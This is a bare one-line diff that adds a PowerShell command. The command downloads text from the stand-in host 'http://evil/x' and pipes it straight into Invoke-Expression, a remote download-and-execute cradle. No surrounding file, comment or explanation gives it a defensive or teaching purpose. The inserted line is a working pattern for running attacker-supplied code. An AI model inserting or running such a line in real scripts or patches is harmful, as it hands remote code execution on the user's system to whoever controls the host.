@@ -1,0 +1,1 @@
+(New-Object Net.WebClient).DownloadString('http://evil/x') | Invoke-Expression
